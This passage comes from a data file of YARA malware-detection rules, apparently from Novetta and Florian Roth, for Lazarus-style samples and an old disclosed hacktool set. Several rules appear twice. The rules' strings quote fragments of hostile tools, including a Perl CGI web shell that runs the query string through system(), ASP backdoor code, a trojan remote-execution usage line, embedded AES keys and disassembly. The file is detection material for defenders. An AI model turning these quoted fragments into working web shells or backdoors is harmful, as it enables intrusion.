\"6e3db4da27f12eaba005217eba7cd9133bc258c97fe44605d12e20a556775009\"\n\n\tstrings:\n\t/*\n\t\tE8 C3 FE FF FF     call    generate64ByteRandomNumber\n\t\t68 C8 01 00 00     push    1C8h            ; dwLength\n\t\t68 D8 E8 40 00     push    offset g_Config ; pvBuffer\n\t\tA3 80 EA 40 00     mov     dword ptr g_Config.qwIdentifier, eax\n\t\t89 15 84 EA 40 00  mov     dword ptr g_Config.qwIdentifier+4, edx\n\t\tE8 F9 E9 FF FF     call    DNSCALCDecode\n\t\t83 C4 08           add     esp, 8\n\t\t8D 4C 24 08        lea     ecx, [esp+214h+var_20C]\n\t\t6A 00              push    0\n\t\t51                 push    ecx\n\t\t68 C8 01 00 00     push    1C8h\n\t\t68 D8 E8 40 00     push    offset g_Config\n\t\t56                 push    esi\n\t\tFF 15 74 E7 40 00  call    WriteFile_9\n\t\t56                 push    esi\n\t\tFF 15 6C E7 40 00  call    CloseHandle_9\n\t*/\n\n\t$a = {E8 [4] 68 [2] 00 00 68 [4] A3 [4]\t89 15 [4] E8 [4] 83 C4 08 8D [3] 6A 00 5? 68 [2] 00 00 \t68 [4] 5? FF 15 [4] 5? \tFF 15}\n\t\t\n\t\t$b1 = \"tmscompg.msi\" wide\n\t\t$b2 = \"cvrit000.bat\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\n\nrule IndiaBravo_generic\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$extractDll = \"[2] - Extract Dll...\" wide\n\t\t$createSvc = \"[3] - CreateSVC...\" wide\n\n\tcondition:\n\t\tall of them\n\t\n}\n\nrule IndiaCharlie_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"WMPNetworkSvcUpdate\"\n\t\t$ = \"backSched.dll\"\n\t\t$ = \"\\\\mspaint.exe\"\n\t\t$aesKey = \"X,LLIe{))%%l2i<[AM|aq!Ql/lPlw]d7@C-#j.<c|#*}Kx4_H(q^F-F^p/[t#%HT\"\n\tcondition:\n\t\t2 of them or $aesKey\n}\n\nrule IndiaCharlie_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$s1 = \"%s is an essential element in Windows System configuration and management. %s\"\n\t\t$s2 = \"%SYSTEMROOT%\\\\system32\\\\svchost.exe -k \"\n\t\t$s3 = \"%s\\\\system32\\\\%s\"\n\t\t$s4 = \"\\\\mspaint.exe\"\n\t\t$s5 = \":R\\nIF NOT EXIST %s GOTO E\\ndel /a %s\\nGOTO R\\n:E\\ndel /a d.bat\"\n\t\t$aesKey = \"}[eLkQAeEae0t@h18g!)3x-RvE%+^`n.6^()?+00ME6a&F7vcV}",
  "RangeScan": "rule RangeScan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RangeScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"bace2c65ea67ac4725cb24aa9aee7c2bec6465d7\"\n\tstrings:\n\t\t$s0 = \"RangeScan.EXE\" fullword wide\n\t\t$s4 = \"<br><p align=\\\"center\\\"><b>RangeScan \" fullword ascii\n\t\t$s9 = \"Produced by isn0\" fullword ascii\n\t\t$s10 = \"RangeScan\" fullword wide\n\t\t$s20 = \"%d-%d-%d %d:%d:%d\" fullword ascii\n\tcondition:\n\t\t3 of them\n}",
  "XYZCmd_zip_Folder_Readme": "rule XYZCmd_zip_Folder_Readme {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Readme.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"967cb87090acd000d22e337b8ce4d9bdb7c17f70\"\n\tstrings:\n\t\t$s3 = \"3.xyzcmd \\\\\\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe\" fullword ascii\n\t\t$s20 = \"XYZCmd V1.0\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "ByPassFireWall_zip_Folder_Inject": "rule ByPassFireWall_zip_Folder_Inject {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Inject.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"34f564301da528ce2b3e5907fd4b1acb7cb70728\"\n\tstrings:\n\t\t$s6 = \"Fail To Inject\" fullword ascii\n\t\t$s7 = \"BtGRemote Pro; V1.5 B/{\" fullword ascii\n\t\t$s11 = \" Successfully\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_sqlcmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 40\n\t\thash = \"b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a\"\n\tstrings:\n\t\t$s0 = \"Permission denial to EXEC command.:(\" fullword ascii\n\t\t$s3 = \"by Eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s4 = \"Connect to %s MSSQL server success.Enjoy the shell.^_^\" fullword ascii\n\t\t$s5 = \"Usage: %s <host> <uid> <pwd>\" fullword ascii\n\t\t$s6 = \"SqlCmd2.exe Inside Edition.\" fullword ascii\n\t\t$s7 = \"Http://www.patching.net  2000/12/14\" fullword ascii\n\t\t$s11 = \"Example: %s 192.168.0.1 sa \\\"\\\"\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule ASPack_ASPACK {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPACK.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c589e6fd48cfca99d6335e720f516e163f6f3f42\"\n\tstrings:\n\t\t$s0 = \"ASPACK.EXE\" fullword wide\n\t\t$s5 = \"CLOSEDFOLDER\" fullword wide\n\t\t$s10 = \"ASPack compressor\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_2323 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file 2323.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21812186a9e92ee7ddc6e91e4ec42991f0143763\"\n\tstrings:\n\t\t$s0 = \"port - Port to listen on, defaults to 2323\" fullword ascii\n\t\t$s1 = \"Usage: srvcmd.exe [/h] [port]\" fullword ascii\n\t\t$s3 = \"Failed to execute shell\" fullword ascii\n\t\t$s5 = \"/h   - Hide Window\" fullword ascii\n\t\t$s7 = \"Accepted connection from client at %s\" fullword ascii\n\t\t$s9 = \"Error %d: %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Install.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"95866e917f699ee74d4735300568640ea1a05afd\"\n\tstrings:\n\t\t$s1 = \"http://go.163.com/sdemo\" fullword wide\n\t\t$s2 = \"Player.tmp\" fullword ascii\n\t\t$s3 = \"Player.EXE\" fullword wide\n\t\t$s4 = \"mailto:sdemo@263.net\" fullword ascii\n\t\t$s5 = \"S-Player.exe\" fullword ascii\n\t\t$s9 = \"http://www.BaiXue.net (\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_TFTPD32 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TFTPD32.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8\"\n\tstrings:\n\t\t$s0 = \" http://arm.533.net\" fullword ascii\n\t\t$s1 = \"Tftpd32.hlp\" fullword ascii\n\t\t$s2 = \"Timeouts and Ports should be numerical and can not be 0\" fullword ascii\n\t\t$s3 = \"TFTPD32 -- \" fullword wide\n\t\t$s4 = \"%d -- %s\" fullword ascii\n\t\t$s5 = \"TIMEOUT while waiting for Ack block %d. file <%s>\" fullword ascii\n\t\t$s12 = \"TftpPort\" fullword ascii\n\t\t$s13 = \"Ttftpd32BackGround\" fullword ascii\n\t\t$s17 = \"SOFTWARE\\\\TFTPD32\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_iecv {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file iecv.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"6e6e75350a33f799039e7a024722cde463328b6d\"\n\tstrings:\n\t\t$s1 = \"Edit The Content Of Cookie \" fullword wide\n\t\t$s3 = \"Accessories\\\\wordpad.exe\" fullword ascii\n\t\t$s4 = \"gorillanation.com\" fullword ascii\n\t\t$s5 = \"Before editing the content of a cookie, you should close all windows of Internet\" ascii\n\t\t$s12 = \"http://nirsoft.cjb.net\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Antiy_Ports_1_21 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0\"\n\tstrings:\n\t\t$s0 = \"AntiyPorts.EXE\" fullword wide\n\t\t$s7 = \"AntiyPorts MFC Application\" fullword wide\n\t\t$s20 = \" @Stego:\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule perlcmd_zip_Folder_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.cgi\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21b5dc36e72be5aca5969e221abfbbdd54053dd8\"\n\tstrings:\n\t\t$s0 = \"syswrite(STDOUT, \\\"Content-type: text/html\\\\r\\\\n\\\\r\\\\n\\\", 27);\" fullword ascii\n\t\t$s1 = \"s/%20/ /ig;\" fullword ascii\n\t\t$s2 = \"syswrite(STDOUT, \\\"\\\\r\\\\n</PRE></HTML>\\\\r\\\\n\\\", 17);\" fullword ascii\n\t\t$s4 = \"open(STDERR, \\\">&STDOUT\\\") || die \\\"Can't redirect STDERR\\\";\" fullword ascii\n\t\t$s5 = \"$_ = $ENV{QUERY_STRING};\" fullword ascii\n\t\t$s6 = \"$execthis = $_;\" fullword ascii\n\t\t$s7 = \"system($execthis);\" fullword ascii\n\t\t$s12 = \"s/%2f/\\\\//ig;\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule aspbackdoor_asp3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e5588665ca6d52259f7d9d0f13de6640c4e6439c\"\n\tstrings:\n\t\t$s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n\t\t$s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n\t\t$s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n\t\t$s14 = \" Windows NT \" fullword ascii\n\t\t$s16 = \" WIndows 2000 \" fullword ascii\n\t\t$s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n\t\t$s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n\t\t$s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_FPipe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s3 = \" -s    - outbound source port number\" fullword ascii\n\t\t$s5 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s20 = \"Attempting to connect to %s port %d\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_concon {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file concon.com\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"816b69eae66ba2dfe08a37fff077e79d02b95cc1\"\n\tstrings:\n\t\t$s0 = \"Usage: concon \\\\\\\\ip\\\\sharename\\\\con\\\\con\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_regdll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5e16a00bcb1437bfe519b707e0f5c5f63a488d\"\n\tstrings:\n\t\t$s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n\t\t$s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n\t\t$s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n\t\t$s5 = \"Public Property Get oFS()\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CleanIISLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file CleanIISLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"827cd898bfe8aa7e9aaefbe949d26298f9e24094\"\n\tstrings:\n\t\t$s1 = \"CleanIP - Specify IP Address Which You Want Clear.\" fullword ascii\n\t\t$s2 = \"LogFile - Specify Log File Which You Want Process.\" fullword ascii\n\t\t$s8 = \"CleanIISLog Ver\" fullword ascii\n\t\t$s9 = \"msftpsvc\" fullword ascii\n\t\t$s10 = \"Fatal Error: MFC initialization failed\" fullword ascii\n\t\t$s11 = \"Specified \\\"ALL\\\" Will Process All Log Files.\" fullword ascii\n\t\t$s12 = \"Specified \\\".\\\" Will Clean All IP Record.\" fullword ascii\n\t\t$s16 = \"Service %s Stopped.\" fullword ascii\n\t\t$s20 = \"Process Log File %s...\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule sqlcheck {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcheck.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5a5778ac200078b627db84fdc35bf5bcee232dc7\"\n\tstrings:\n\t\t$s0 = \"Power by eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s3 = \"\\\\ipc$ \\\"\\\" /user:\\\"\\\"\" fullword ascii\n\t\t$s4 = \"SQLCheck can only scan a class B network. Try again.\" fullword ascii\n\t\t$s14 = \"Example: SQLCheck 192.168.0.1 192.168.0.254\" fullword ascii\n\t\t$s20 = \"Usage: SQLCheck <StartIP> <EndIP>\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule sig_238_RunAsEx {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RunAsEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35\"\n\tstrings:\n\t\t$s0 = \"RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com\" fullword ascii\n\t\t$s8 = \"cmd.bat\" fullword ascii\n\t\t$s9 = \"Note: This Program Can'nt Run With Local Machine.\" fullword ascii\n\t\t$s11 = \"%s Execute Succussifully.\" fullword ascii\n\t\t$s12 = \"winsta0\" fullword ascii\n\t\t$s15 = \"Usage: RunAsEx <UserName> <Password> <Execute File> [\\\"Execute Option\\\"]\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule sig_238_nbtdump {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file nbtdump.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8\"\n\tstrings:\n\t\t$s0 = \"Creation of results file - \\\"%s\\\" failed.\" fullword ascii\n\t\t$s1 = \"c:\\\\>nbtdump remote-machine\" fullword ascii\n\t\t$s7 = \"Cerberus NBTDUMP\" fullword ascii\n\t\t$s11 = \"<CENTER><H1>Cerberus Internet Scanner</H1>\" fullword ascii\n\t\t$s18 = \"<P><H3>Account Information</H3><PRE>\" fullword wide\n\t\t$s19 = \"%s's password is %s</H3>\" fullword wide\n\t\t$s20 = \"%s's password is blank</H3>\" fullword wide\n\tcondition:\n\t\t5 of them\n}\n\nrule sig_238_Glass2k {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Glass2k.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"b05455a1ecc6bc7fc8ddef312a670f2013704f1a\"\n\tstrings:\n\t\t$s0 = \"Portions Copyright (c) 1997-1999 Lee Hasiuk\" fullword ascii\n\t\t$s1 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\" fullword ascii\n\t\t$s3 = \"WINNT\\\\System32\\\\stdole2.tlb\" fullword ascii\n\t\t$s4 = \"Glass2k.exe\" fullword wide\n\t\t$s7 = \"NeoLite Executable File Compressor\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule SplitJoin_V1_3_3_rar_Folder_3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21409117b536664a913dcd159d6f4d8758f43435\"\n\tstrings:\n\t\t$s2 = \"ie686@sohu.com\" fullword ascii\n\t\t$s3 = \"splitjoin.exe\" fullword ascii\n\t\t$s7 = \"SplitJoin\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_EDIT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"12196cf62931cde7b6cb979c07bb5cc6a7535cbb\"\n\tstrings:\n\t\t$s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n\t\t$s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n\t\t$s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n\t\t$s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n\t\t$s7 = \"color: rgb(255,0,0); text-decoration: underline }\" fullword ascii\n\t\t$s13 = \"if Request(\\\"creat\\\")<>\\\"yes\\\" then\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "sig_238_sqlcmd": "rule sig_238_sqlcmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 40\n\t\thash = \"b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a\"\n\tstrings:\n\t\t$s0 = \"Permission denial to EXEC command.:(\" fullword ascii\n\t\t$s3 = \"by Eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s4 = \"Connect to %s MSSQL server success.Enjoy the shell.^_^\" fullword ascii\n\t\t$s5 = \"Usage: %s <host> <uid> <pwd>\" fullword ascii\n\t\t$s6 = \"SqlCmd2.exe Inside Edition.\" fullword ascii\n\t\t$s7 = \"Http://www.patching.net  2000/12/14\" fullword ascii\n\t\t$s11 = \"Example: %s 192.168.0.1 sa \\\"\\\"\" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "ASPack_ASPACK": "rule ASPack_ASPACK {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPACK.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c589e6fd48cfca99d6335e720f516e163f6f3f42\"\n\tstrings:\n\t\t$s0 = \"ASPACK.EXE\" fullword wide\n\t\t$s5 = \"CLOSEDFOLDER\" fullword wide\n\t\t$s10 = \"ASPack compressor\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "sig_238_2323": "rule sig_238_2323 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file 2323.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21812186a9e92ee7ddc6e91e4ec42991f0143763\"\n\tstrings:\n\t\t$s0 = \"port - Port to listen on, defaults to 2323\" fullword ascii\n\t\t$s1 = \"Usage: srvcmd.exe [/h] [port]\" fullword ascii\n\t\t$s3 = \"Failed to execute shell\" fullword ascii\n\t\t$s5 = \"/h   - Hide Window\" fullword ascii\n\t\t$s7 = \"Accepted connection from client at %s\" fullword ascii\n\t\t$s9 = \"Error %d: %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Jc_ALL_WinEggDropShell_rar_Folder_Install_2": "rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Install.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"95866e917f699ee74d4735300568640ea1a05afd\"\n\tstrings:\n\t\t$s1 = \"http://go.163.com/sdemo\" fullword wide\n\t\t$s2 = \"Player.tmp\" fullword ascii\n\t\t$s3 = \"Player.EXE\" fullword wide\n\t\t$s4 = \"mailto:sdemo@263.net\" fullword ascii\n\t\t$s5 = \"S-Player.exe\" fullword ascii\n\t\t$s9 = \"http://www.BaiXue.net (\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "sig_238_TFTPD32": "rule sig_238_TFTPD32 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TFTPD32.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8\"\n\tstrings:\n\t\t$s0 = \" http://arm.533.net\" fullword ascii\n\t\t$s1 = \"Tftpd32.hlp\" fullword ascii\n\t\t$s2 = \"Timeouts and Ports should be numerical and can not be 0\" fullword ascii\n\t\t$s3 = \"TFTPD32 -- \" fullword wide\n\t\t$s4 = \"%d -- %s\" fullword ascii\n\t\t$s5 = \"TIMEOUT while waiting for Ack block %d. file <%s>\" fullword ascii\n\t\t$s12 = \"TftpPort\" fullword ascii\n\t\t$s13 = \"Ttftpd32BackGround\" fullword ascii\n\t\t$s17 = \"SOFTWARE\\\\TFTPD32\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_iecv": "rule sig_238_iecv {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file iecv.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"6e6e75350a33f799039e7a024722cde463328b6d\"\n\tstrings:\n\t\t$s1 = \"Edit The Content Of Cookie \" fullword wide\n\t\t$s3 = \"Accessories\\\\wordpad.exe\" fullword ascii\n\t\t$s4 = \"gorillanation.com\" fullword ascii\n\t\t$s5 = \"Before editing the content of a cookie, you should close all windows of Internet\" ascii\n\t\t$s12 = \"http://nirsoft.cjb.net\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Antiy_Ports_1_21": "rule Antiy_Ports_1_21 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0\"\n\tstrings:\n\t\t$s0 = \"AntiyPorts.EXE\" fullword wide\n\t\t$s7 = \"AntiyPorts MFC Application\" fullword wide\n\t\t$s20 = \" @Stego:\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "perlcmd_zip_Folder_cmd": "rule perlcmd_zip_Folder_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.cgi\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21b5dc36e72be5aca5969e221abfbbdd54053dd8\"\n\tstrings:\n\t\t$s0 = \"syswrite(STDOUT, \\\"Content-type: text/html\\\\r\\\\n\\\\r\\\\n\\\", 27);\" fullword ascii\n\t\t$s1 = \"s/%20/ /ig;\" fullword ascii\n\t\t$s2 = \"syswrite(STDOUT, \\\"\\\\r\\\\n</PRE></HTML>\\\\r\\\\n\\\", 17);\" fullword ascii\n\t\t$s4 = \"open(STDERR, \\\">&STDOUT\\\") || die \\\"Can't redirect STDERR\\\";\" fullword ascii\n\t\t$s5 = \"$_ = $ENV{QUERY_STRING};\" fullword ascii\n\t\t$s6 = \"$execthis = $_;\" fullword ascii\n\t\t$s7 = \"system($execthis);\" fullword ascii\n\t\t$s12 = \"s/%2f/\\\\//ig;\" fullword ascii\n\tcondition:\n\t\t6 of them\n}",
  "aspbackdoor_asp3": "rule aspbackdoor_asp3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e5588665ca6d52259f7d9d0f13de6640c4e6439c\"\n\tstrings:\n\t\t$s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n\t\t$s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n\t\t$s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n\t\t$s14 = \" Windows NT \" fullword ascii\n\t\t$s16 = \" WIndows 2000 \" fullword ascii\n\t\t$s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n\t\t$s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n\t\t$s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_FPipe": "rule sig_238_FPipe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s3 = \" -s    - outbound source port number\" fullword ascii\n\t\t$s5 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s20 = \"Attempting to connect to %s port %d\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_concon": "rule sig_238_concon {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file concon.com\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"816b69eae66ba2dfe08a37fff077e79d02b95cc1\"\n\tstrings:\n\t\t$s0 = \"Usage: concon \\\\\\\\ip\\\\sharename\\\\con\\\\con\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
